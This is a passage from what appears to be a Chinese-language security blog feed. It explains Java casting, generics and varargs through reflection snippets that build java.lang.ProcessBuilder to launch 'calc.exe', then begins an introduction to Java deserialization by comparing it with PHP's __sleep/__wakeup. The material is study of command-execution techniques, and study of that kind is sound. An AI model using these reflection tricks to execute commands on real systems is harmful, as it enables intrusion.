class="string">&quot;calc.exe&quot;</span>))).start();</span><br></pre></td></tr></table></figure><p>这其实是一个强制类型转换</p><p>将<code>clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;))</code> 的返回值从 <code>Object</code> 强制转换为 <code>ProcessBuilder</code> 类型。</p><h2 id="强制转换"><a href="#强制转换" class="headerlink" title="强制转换"></a>强制转换</h2><p>在 Java 中，反射相关的方法（如 <code>newInstance()</code>）返回的类型通常是 <code>Object</code>。为了调用具体类的方法，必须将返回的 <code>Object</code> 类型强制转换为正确的类型。</p><p>在上面的payload中，<code>clazz.getConstructor().newInstance()</code> 返回的是 <code>Object</code> 类型，这个对象在实际运行时是 <code>ProcessBuilder</code> 的实例。因此，为了能够调用 <code>ProcessBuilder</code> 的方法（如 <code>start()</code>），必须将它转换为 <code>ProcessBuilder</code> 类型。</p><p>为了防止抛出<code>ClassCastException</code>异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ProcessBuilder) &#123;</span><br><span class="line">    <span class="type">ProcessBuilder</span> <span class="variable">pb</span> <span class="operator">=</span> (ProcessBuilder) obj;</span><br><span class="line">    pb.start();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;对象不是 ProcessBuilder 类型&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这里，<code>instanceof</code> 用来检查 <code>obj</code> 是否是 <code>ProcessBuilder</code> 类型。如果是，则进行强制类型转换；否则，输出错误信息。</p><h3 id="其他常见的强制类型转换场景"><a href="#其他常见的强制类型转换场景" class="headerlink" title="其他常见的强制类型转换场景"></a>其他常见的强制类型转换场景</h3><ol><li><p><strong>向下转型</strong>：从父类或接口类型向子类转型，这是最常见的强制类型转换。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) obj;  <span class="comment">// 强制类型转换，将 Object 转换为 String</span></span><br></pre></td></tr></table></figure></li><li><p><strong>泛型类型擦除</strong>：由于 Java 泛型在运行时会被类型擦除，有时候你可能需要强制将 <code>Object</code> 类型转换为某个泛型类型。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List&lt;?&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">List&lt;String&gt; stringList = (List&lt;String&gt;) list;  <span class="comment">// 强制转换为泛型类型</span></span><br></pre></td></tr></table></figure></li><li><p><strong>接口类型转换</strong>：当一个类实现了某个接口时，你可以将该对象强制转换为接口类型。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">Collection&lt;String&gt; collection = (Collection&lt;String&gt;) list;  <span class="comment">// 强制转换为 Collection 类型</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="泛型类型擦除"><a href="#泛型类型擦除" class="headerlink" title="泛型类型擦除"></a>泛型类型擦除</h2><h4 id="实际情况：Java-编译时的泛型类型和运行时的类型擦除"><a href="#实际情况：Java-编译时的泛型类型和运行时的类型擦除" class="headerlink" title="实际情况：Java 编译时的泛型类型和运行时的类型擦除"></a>实际情况：Java 编译时的泛型类型和运行时的类型擦除</h4><p>例如，假设你有一个 <code>List&lt;String&gt;</code>，在编译时，Java 会知道这个 <code>List</code> 是用于存储 <code>String</code> 类型的对象，但是在运行时，Java 会将它当作一个普通的 <code>List</code>，类型信息被“擦除”。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; stringList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">stringList.add(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line"></span><br><span class="line">List&lt;Integer&gt; intList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">intList.add(<span class="number">111</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在运行时，类型信息被擦除，两者都变成 List</span></span><br></pre></td></tr></table></figure><p>在运行时，<code>stringList</code> 和 <code>intList</code> 看起来一样，它们都是 <code>List</code>，并且不保留 <code>String</code> 或 <code>Integer</code> 类型的信息。这就是<strong>类型擦除</strong>的本质。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GenericBox</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> T item;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(T item)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.item = item;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> item;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        GenericBox&lt;String&gt; stringBox = <span class="keyword">new</span> <span class="title class_">GenericBox</span>&lt;&gt;();</span><br><span class="line">        stringBox.set(<span class="string">&quot;kanye&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        GenericBox&lt;Integer&gt; intBox = <span class="keyword">new</span> <span class="title class_">GenericBox</span>&lt;&gt;();</span><br><span class="line">        intBox.set(<span class="number">111</span>);</span><br><span class="line">        </span><br><span class="line">        System.out.println(stringBox.get());  <span class="comment">//kanye</span></span><br><span class="line">        System.out.println(intBox.get());  <span class="comment">//111</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然 <code>GenericBox&lt;String&gt;</code> 和 <code>GenericBox&lt;Integer&gt;</code> 在编译时有区别，但在运行时，这两个对象是相同的，都是 <code>GenericBox</code> 类型。Java 编译器在编译时确保类型安全，但在运行时，<strong>所有泛型类型的具体信息都被擦除</strong>。</p><h4 id="泛型类型擦除的好处和限制："><a href="#泛型类型擦除的好处和限制：" class="headerlink" title="泛型类型擦除的好处和限制："></a>泛型类型擦除的好处和限制：</h4><ul><li><strong>好处</strong>：泛型类型擦除让 Java 的泛型能够与已有的类库和接口兼容（如 <code>Collection</code>），不需要对旧代码做大的修改。</li><li><strong>限制</strong>：由于类型信息被擦除，Java 的泛型不能用于基础类型（如 <code>int</code>），也无法在运行时检查对象的泛型类型。你无法在运行时获取泛型类型的具体信息。</li></ul><p>例如，下面代码是非法的，因为泛型类型在运行时被擦除，Java 无法知道 <code>List&lt;Integer&gt;</code> 和 <code>List&lt;String&gt;</code> 的区别：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (stringList <span class="keyword">instanceof</span> List&lt;String&gt;) &#123;  <span class="comment">// 错误：类型擦除后，无法区分 List&lt;String&gt; 和其他类型</span></span><br><span class="line">    System.out.println(<span class="string">&quot;This is a list of strings&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="接口类型转换"><a href="#接口类型转换" class="headerlink" title="接口类型转换"></a>接口类型转换</h2><p>假设你有一个类实现了多个接口，你可以在代码中将该对象转换为不同的接口类型。例如，类 <code>Person</code> 实现了 <code>Singer</code> 和 <code>Programmer</code> 两个接口。根据具体场景，你可以将 <code>Person</code> 对象转换为 <code>Singer</code> 或 <code>Programmer</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Singer</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">sing</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Programmer</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">code</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Singer</span>, Programmer &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sing</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.prinln(<span class="string">&quot;Singing...&quot;</span>);</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">code</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Coding...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将 person 转换为 Singer 类型，调用 sing 方法</span></span><br><span class="line">        <span class="type">Singer</span> <span class="variable">singer</span> <span class="operator">=</span> (Singer) person;</span><br><span class="line">        singer.sing();  <span class="comment">// 输出: Singing...</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将 person 转换为 Programmer 类型，调用 code 方法</span></span><br><span class="line">        <span class="type">Programmer</span> <span class="variable">programmer</span> <span class="operator">=</span> (Programmer) person;</span><br><span class="line">        programmer.code();  <span class="comment">// 输出: Coding...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="接口类型转换的规则："><a href="#接口类型转换的规则：" class="headerlink" title="接口类型转换的规则："></a>接口类型转换的规则：</h4><ul><li>如果一个类实现了某个接口，你可以将该对象转换为这个接口类型。</li><li>如果尝试将对象转换为它没有实现的接口，编译器会抛出错误。</li><li>接口转换的好处是让代码更加灵活，增强了多态性，使对象可以以不同的方式在不同的场景中工作。</li></ul><h4 id="强制类型转换（接口类型转换）："><a href="#强制类型转换（接口类型转换）：" class="headerlink" title="强制类型转换（接口类型转换）："></a>强制类型转换（接口类型转换）：</h4><p>接口类型转换使用 Java 的<strong>强制类型转换</strong>，就像将一个对象从父类转换为子类一样，必须通过 <code>(InterfaceType)</code> 的语法进行转换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Programmer</span> <span class="variable">programmer</span> <span class="operator">=</span> (Programmer) person;</span><br></pre></td></tr></table></figure><h2 id="可变长参数"><a href="#可变长参数" class="headerlink" title="可变长参数"></a>可变长参数</h2><p>首先可以知道<code>ProcessBuilder</code>有两个构造函数</p><p><img src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20240906184334741.png" alt="image-20240906184334741"></p><p>Java里的可变长参数（<code>varargs</code>）了。正如其他语言一样，Java也支持可变长参数，就是当你</p><p>定义函数的时候不确定参数数量的时候，可以使用<code>...</code>这样的语法来表示“这个函数的参数个数是可变</p><p>的”。</p><blockquote><p>对于可变长参数，Java其实在编译的时候会编译成一个数组，也就是说，如下这两种写法在底层是等价</p><p>的及签名一样（也就不能重载）：</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String[] names)</span> &#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String...names)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>也由此，如果我们有一个数组，想传给hello函数，只需直接传即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String[] names = &#123;<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>&#125;;</span><br><span class="line">hello(names);</span><br></pre></td></tr></table></figure><p>那么对于反射来说，如果要获取的目标函数里包含可变长参数，其实我们认为它是数组就行了。</p><p>所以，我们将字符串数组的类 String[].class 传给 getConstructor ，获取 ProcessBuilder 的第二</p><p>种构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">reflectClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">reflectClass.getConstructor(String[].class);</span><br></pre></td></tr></table></figure><p>所以有两层数组，</p><ul><li>外层为调用构造函数所需要的<code>数组</code></li><li>内层为需要传给<code>已经实例化的对象的方法</code>的<code>命令</code>也是一个数组</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">reflectClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)</span><br><span class="line">reflectClass.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;)</span><br><span class="line"> );</span><br><span class="line"></span><br><span class="line"><span class="comment">//完全反射编写</span></span><br><span class="line">Class&lt;?&gt; reflectClass = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line"></span><br><span class="line">Constructor&lt;?&gt; constructor = reflectClass.getConstructor(String[].class);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">processBuilderInstance</span> <span class="operator">=</span> constructor.newInstance((Object) <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">Method&lt;?&gt; startMethod = reflectClass.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line"><span class="comment">//当然可以用getDeclareMethod，但是ProcessBuilder的实例里的start方法是public的，所以没必要用getDclareMethod</span></span><br><span class="line"></span><br><span class="line">startMethod.invoke(processBuilderInstance);</span><br><span class="line"><span class="comment">//还记得之前写的invoke的使用逻辑吗？</span></span><br><span class="line"><span class="comment">//比如aa(bb,cc).dd用invoke调用的话就是dd.invoke(aa,bb);</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化</title>
      <link href="/2024/02/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/02/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在现代软件开发中，数据的传输和存储是不可避免的需求。为了在不同的系统、语言和环境之间交换数据，开发者通常采用一些标准的格式，如 JSON 和 XML。然而，这些格式在处理复杂数据类型（如对象、集合等）时存在局限性。为了解决这个问题，许多语言和框架引入了序列化和反序列化机制，将对象转换为字节流，以便传输和存储。</p><p><strong>序列化（Serialization）</strong>：将对象的状态转换为字节流。</p><p><strong>反序列化（Deserialization）</strong>：将字节流恢复为对象的过程。</p><p>大多数处理方法中，JSON和XML支持的数据类型就是基本数据类型，整型、浮点型、字符串、布尔等，如果开发者希望在传输数据的时候直接传输一个对象，那么就不得不想办法扩展基础的JSON（XML）语法。</p><p>不管是Jackson、Fastjson还是编程语言内置的序列化方法，一旦涉及到序列化与反序列化数据，就可能会涉及到安全问题。</p><ul><li><p><strong>对象的创建和方法的自动调用</strong>：在反序列化过程中，Java 虚拟机会自动创建对象，并可能调用某些特殊的方法（如 <code>readObject()</code>、<code>readResolve()</code>）。这些方法可能包含自定义的逻辑，攻击者可以利用这些方法执行不安全的操作。</p></li><li><p><strong>类的加载和实例化</strong>：反序列化过程中，JVM 会根据序列化数据中的类名加载相应的类。如果类路径中存在恶意类，可能导致执行未预期的代码。</p></li></ul><h1 id="通过对比PHP的-wakeup和java的readobject的区别来深入理解java反序列化"><a href="#通过对比PHP的-wakeup和java的readobject的区别来深入理解java反序列化" class="headerlink" title="通过对比PHP的__wakeup和java的readobject的区别来深入理解java反序列化"></a>通过对比PHP的__wakeup和java的readobject的区别来深入理解java反序列化</h1><p>readObject 倾向于解决“ <strong>反序列化时如</strong> <strong>何还原一个完整对象</strong>“这个问题，而PHP的 __wakeup 更倾向于解决“<strong>反序列化后如何初始化这个对象</strong>”的问题。</p><h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><p>PHP的序列化是<code>开发者不能参与的</code>，开发者调用 serialize 函数后，序列化的数据就<code>已经完成了</code>，你得到的是一个完整的对象，你并不能在序列化数据流里新增某一个内容，你如果想插入新的内容，只有将其保存在一个属性中。也就是说PHP的序列化、反序列化是一个<code>纯内部</code>的过程，而其 __sleep 、__wakeup 魔术方法的目的就是在序列化、反序列化的<code>前后</code>执行一些操作。</p><blockquote><p>总结：<strong>无法在序列化数据流中插入自定义内容</strong>，开发者不能直接干预序列化过程，只能通过对象的属性来影响序列化结果。</p></blockquote><h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h3><p>在序列化之前执行，返回一个数组，包含需要序列化的属性名。</p><ul><li><p>清理对象中不需要序列化的资源（如关闭数据库连接）。</p></li><li><p>选择性地序列化对象的属性。</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$link</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 在序列化之前关闭连接</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;link = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;link&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><p>在反序列化之后执行，用于恢复对象的状态。</p><ul><li><p>重新建立数据库连接或其他资源。</p></li><li><p>初始化未序列化的属性。</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$link</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 在反序列化之后重新建立连接</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;link = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="资源类型的序列化问题"><a href="#资源类型的序列化问题" class="headerlink" title="资源类型的序列化问题"></a>资源类型的序列化问题</h3><ul><li><p><strong>资源类型（Resource）</strong>：表示外部资源的特殊变量，如数据库连接、文件句柄等。</p></li><li><p><strong>不可序列化</strong>：资源类型无法被序列化，序列化后会变为 <code>NULL</code>。</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$link</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dsn = <span class="variable">$dsn</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;link = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$this</span>-&gt;dsn, <span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title class_">Connection</span>(<span class="string">&#x27;mysql:host=localhost;dbname=test&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$conn</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialized</span>;</span><br><span class="line"><span class="comment">// 输出的序列化数据中，$link 属性的值为 NULL</span></span><br></pre></td></tr></table></figure><ul><li><strong>原因</strong>：<code>$link</code> 是一个 PDO 对象，内部包含资源，无法序列化，结果为 <code>NULL</code>。</li></ul><p>所以要sleep（）返回三个参数，然后wakeup执行connect</p><h2 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h2><p>Java反序列化的操作，很多是需要开发者深入参与的，所以你会发现大量的库会实现 readObject 、writeObject 方法，这和PHP中 __wakeup 、__sleep 很少使用是存在鲜明对比的。</p><p>其实很好理解</p><p>最大的区别就是java能够控制序列化的过程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line">    s.writeObject(<span class="string">&quot;This is a object&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> (String) s.readObject();</span><br><span class="line">    System.out.println(message);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-objectAnnotation-的角色"><a href="#3-objectAnnotation-的角色" class="headerlink" title="3. objectAnnotation 的角色"></a>3. <strong>objectAnnotation 的角色</strong></h3><p>在这段代码中，特别引人注意的是 <code>objectAnnotation</code>。在 Java 的序列化过程中，除了对象的字段信息之外，开发者还可以将额外的数据放入 <code>objectAnnotation</code> 区域中。这使得 Java 的序列化变得更加灵活。通过 <code>writeObject</code> 写入的 <code>&quot;This is a object&quot;</code> 就被存放在 <code>objectAnnotation</code> 中。</p><p>序列化生成的数据流内容展示了这一点：</p><p><img src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20240925040709147.png" alt="image-20240925040709147"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">objectAnnotation</span><br><span class="line">TC_STRING - <span class="number">0x74</span></span><br><span class="line">newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">05</span></span><br><span class="line">Length - <span class="number">16</span> - <span class="number">0x00</span> <span class="number">10</span></span><br><span class="line">Value - This is a object - <span class="number">0x546869732069732061206f626a656374</span></span><br><span class="line">TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br></pre></td></tr></table></figure><p>这里的 <code>objectAnnotation</code> 位置就是用于存储额外的序列化数据。在反序列化时，通过 <code>readObject()</code> 可以读取该区域的数据并进行相应的处理。</p><hr><p><strong><code>classAnnotation</code></strong> 主要用于描述类的额外信息，和类的元数据相关，开发者通常不会直接操作。</p><p><strong><code>objectAnnotation</code></strong> 则用于存储对象级别的额外数据，开发者可以通过自定义 <code>writeObject</code> 和 <code>readObject</code> 方法来操作这个区域。</p><h3 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 